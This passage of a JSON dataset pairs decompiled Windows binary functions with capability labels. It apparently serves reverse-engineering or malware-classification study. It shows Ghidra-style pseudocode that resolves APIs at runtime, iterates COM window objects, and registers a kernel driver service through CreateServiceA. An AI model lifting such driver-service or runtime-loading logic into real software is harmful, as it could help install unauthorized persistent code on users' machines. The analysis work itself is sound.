    "004043a0": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004043a0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uchar auStack592 [260];\n    uchar uStack332;\n    uint uStack331;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    int32_t iStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4051c0;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407410);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = uStack16;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x40741c);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(param_1, uVar2, 0, 0, 2, 1000, &uStack28);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x407430);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = uStack16;\n        return 1;\n    }\n    piStack36 = NULL;\n    uStack8 = 0;\n    iVar1 = (*pcVar3)(uStack28, str._D_3, 0, &piStack36);\n    if ((iVar1 < 0) || (piStack36 == NULL)) {\n        uStack8 = 0xffffffff;\n        if (piStack36 != NULL) {\n            (**(*piStack36 + 8))(piStack36);\n        }\n    }\n    else {\n        piStack40 = NULL;\n        uStack8._0_1_ = 1;\n        iVar1 = (**(*piStack36 + 0x20))(piStack36, &piStack40);\n        if ((-1 < iVar1) && (piStack40 != NULL)) {\n            iStack32 = 0;\n            (**(*piStack40 + 0x24))(piStack40, &iStack32);\n            iStack68 = 0;\n            if (0 < iStack32) {\n                do {\n                    iStack48 = (*_sym.imp.MSVCRT.dll_rand)();\n                    iStack48 = iStack48 % iStack32;\n                    uStack56 = CONCAT22(uStack56._2_2_, 3);\n                    param_1 = NULL;\n                    piStack20 = NULL;\n                    uStack8._0_1_ = 4;\n                    iVar1 = (**(*piStack40 + 0x2c))\n                                      (piStack40, uStack56, uStack52, iStack48, uStack44, uStack56, uStack52, iStack48, \n                                       uStack44, &param_1);\n                    if ((iVar1 < 0) || (param_1 == NULL)) {\n                        uStack8._0_1_ = 3;\n                        if (piStack20 != NULL) {\n                            (**(*piStack20 + 8))(piStack20);\n                        }\njoined_r0x004047bf:\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            uStack8._0_1_ = 2;\n                            (**(*param_1 + 8))(param_1);\n                        }\ncode_r0x004047cb:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack56);\n                        break;\n                    }\n                    iVar1 = (***param_1)(param_1, 0x4061b0, &piStack20);\n                    if (((iVar1 < 0) || (piStack20 == NULL)) ||\n                       (iVar1 = (**(*piStack20 + 0x38))(piStack20, &iStack60),  iVar1 < 0)) {\njoined_r0x00404786:\n                        if (piStack20 != NULL) {\n                            uStack8._0_1_ = 3;\n                            (**(*piStack20 + 8))(piStack20);\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            (**(*param_1 + 8))(param_1);\n                        }\n                        goto code_r0x004047cb;\n                    }\n                    if (iStack60 == 0) {\njoined_r0x004045c2:\n                        if (piStack20 != NULL) {\n                            uStack8._0_1_ = 3;\n                            (**(*piStack20 + 8))(piStack20);\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            (**(*param_1 + 8))(param_1);\n                        }\n                    }\n                    else {\n                        fcn.004041b0(iStack60, auStack592, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack60);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(auStack592, 0x407444);\n                        if (iVar4 != 0) goto joined_r0x004045c2;\n                        piStack24 = NULL;\n                        uStack8._0_1_ = 5;\n                        iVar1 = (***param_1)(param_1, 0x4061a0, &piStack24);\n                        if ((iVar1 < 0) || (piStack24 == NULL)) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\njoined_r0x0040476b:\n                            if (piStack20 != NULL) {\n                                uStack8._0_1_ = 3;\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                            goto joined_r0x004047bf;\n                        }\n                        iVar1 = (**(*piStack24 + 0x20))(piStack24, &iStack64);\n                        iVar4 = iStack64;\n                        if (iVar1 < 0) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            goto joined_r0x0040476b;\n                        }\n                        if (iStack64 == 0) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            uStack8._0_1_ = 3;\n                            if (piStack20 != NULL) {\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                        }\n                        else {\n                            uStack332 = 0;\n                            puVar6 = &uStack331;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.004041b0(iVar4, &uStack332, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack64);\n                            iVar4 = fcn.004042d0(&uStack332);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*piStack20 + 0x114))(piStack20);\n                                uStack8._0_1_ = 4;\n                                if (piStack24 != NULL) {\n                                    (**(*piStack24 + 8))(piStack24);\n                                }\n                                goto joined_r0x00404786;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            uStack8._0_1_ = 3;\n                            if (piStack20 != NULL) {\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            uStack8._0_1_ = 2;\n                            (**(*param_1 + 8))(param_1);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack56);\n                    iStack68 = iStack68 + 1;\n                } while (iStack68 < iStack32);\n            }\n        }\n        if (piStack40 != NULL) {\n            uStack8 = uStack8._1_3_ << 8;\n            (**(*piStack40 + 8))(piStack40);\n        }\n        uStack8 = 0xffffffff;\n        if (piStack36 != NULL) {\n            (**(*piStack36 + 8))(piStack36);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(var_44h);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = uStack16;\n    return iVar1;\n}\n",
        "token_count": 2228
    },
    "00401ae0": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401af4) overlaps instruction at (ram,0x00401af1)\n// \n\nuint __cdecl fcn.00401ae0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    uint32_t in_ECX;\n    char *in_EDX;\n    bool in_ZF;\n    ushort in_stack_fffffff8;\n    uint uVar3;\n    \n    if (!in_ZF) {\n        uVar3 = CONCAT22(in_ECX, in_stack_fffffff8);\n        in_ECX = in_ECX & 0xffff;\n        cVar2 = in_ECX >> 8;\n        if (in_ZF) goto code_r0x00401aed;\n    }\n    cVar2 = in_ECX >> 8;\n    uVar3 = 0;\n    in_EAX = arg_10h;\ncode_r0x00401aed:\n    *in_EDX = *in_EDX + cVar2;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)\n                      (arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, in_EAX, 0, 0, 0, 0, 0x47, uVar3);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 344
    }
}